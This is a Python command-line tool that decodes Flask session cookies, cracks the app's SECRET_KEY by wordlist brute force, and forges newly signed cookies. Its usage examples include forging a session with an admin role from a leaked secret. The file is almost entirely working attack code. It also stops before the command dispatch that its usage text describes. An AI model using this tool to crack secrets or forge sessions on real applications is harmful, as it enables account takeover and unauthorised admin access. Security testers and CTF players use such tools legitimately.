#!/usr/bin/env python3
"""
Flask session cookie tool.

Decode, encode, and crack Flask session cookies signed with itsdangerous.

Usage:
    python flask_cookie.py decode <cookie>
    python flask_cookie.py encode <payload_json> <secret>
    python flask_cookie.py crack <cookie> <wordlist>

Examples:
    python flask_cookie.py decode ".eJyrVi...sig"
    python flask_cookie.py encode '{"user_id": 1, "role": "admin"}' "leaked_secret"
    python flask_cookie.py crack ".eJyrVi...sig" /usr/share/wordlists/rockyou.txt
"""

import sys
import json
import zlib
import base64
import hmac
import hashlib
import time
from itsdangerous import URLSafeTimedSerializer, BadSignature
from itsdangerous.serializer import Serializer


# Flask's default session serializer config
class FlaskSessionSerializer:
    """Mimics Flask's session cookie signing/serialization."""

    salt = "cookie-session"
    digest_method = staticmethod(hashlib.sha1)
    key_derivation = "hmac"
    serializer = json

    @staticmethod
    def get_serializer(secret_key):
        return URLSafeTimedSerializer(
            secret_key,
            salt=FlaskSessionSerializer.salt,
            serializer=TaggedJSONSerializerWrapper(),
            signer_kwargs={
                "key_derivation": FlaskSessionSerializer.key_derivation,
                "digest_method": FlaskSessionSerializer.digest_method,
            },
        )


class TaggedJSONSerializerWrapper:
    """Lightweight stand-in for Flask's TaggedJSONSerializer."""

    def dumps(self, obj):
        return json.dumps(obj, separators=(",", ":"))

    def loads(self, s):
        if isinstance(s, bytes):
            s = s.decode("utf-8")
        return json.loads(s)


def decode_cookie(cookie):
    """Decode a Flask session cookie without verifying its signature."""
    # Split into payload, timestamp, signature
    parts = cookie.split(".")
    if len(parts) < 3:
        raise ValueError("Not a valid Flask session cookie (need 3+ parts)")

    # Leading dot means compressed payload
    compressed = cookie.startswith(".")
    if compressed:
        payload_b64 = parts[1]
        timestamp_b64 = parts[2]
        signature = parts[3] if len(parts) > 3 else ""
    else:
        payload_b64 = parts[0]
        timestamp_b64 = parts[1]
        signature = parts[2]

    # Fix base64 padding and decode
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    raw = base64.urlsafe_b64decode(padded)

    if compressed:
        raw = zlib.decompress(raw)

    data = json.loads(raw)

    # Decode timestamp (itsdangerous uses int seconds, base64-encoded)
    ts_padded = timestamp_b64 + "=" * (-len(timestamp_b64) % 4)
    ts_bytes = base64.urlsafe_b64decode(ts_padded)
    timestamp = int.from_bytes(ts_bytes, "big")

    return {
        "payload": data,
        "timestamp": timestamp,
        "timestamp_human": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(timestamp)),
        "signature": signature,
        "compressed": compressed,
    }


def encode_cookie(payload, secret_key):
    """Sign a new Flask session cookie with the given secret."""
    serializer = FlaskSessionSerializer.get_serializer(secret_key)
    return serializer.dumps(payload)


def verify_signature(cookie, secret_key):
    """Check if a secret correctly verifies the cookie's signature."""
    serializer = FlaskSessionSerializer.get_serializer(secret_key)
    try:
        # max_age=None means we don't reject expired tokens during cracking
        serializer.loads(cookie, max_age=None)
        return True
    except BadSignature:
        return False
    except Exception:
        return False


def crack_secret(cookie, wordlist_path):
    """Try each word in the wordlist as a potential SECRET_KEY."""
    print(f"[*] Cracking signature for cookie...")
    print(f"[*] Wordlist: {wordlist_path}\n")

    tried = 0
    start = time.time()

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                secret = line.rstrip("\n").rstrip("\r")
                if not secret:
                    continue
                tried += 1

                if tried % 1000 == 0:
                    elapsed = time.time() - start
                    rate = tried / elapsed if elapsed > 0 else 0
                    print(f"\r[*] Tried {tried} candidates ({rate:.0f}/sec) — current: {secret[:30]}    ", end="", flush=True)

                if verify_signature(cookie, secret):
                    elapsed = time.time() - start
                    print(f"\n\n[+] FOUND SECRET: {secret!r}")
                    print(f"[+] Tried {tried} candidates in {elapsed:.2f}s")
                    return secret
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        return None
    except KeyboardInterrupt:
        print(f"\n[!] Aborted after {tried} attempts")
        return None

    print(f"\n[-] Exhausted wordlist ({tried} candidates). No match found.")
    return None

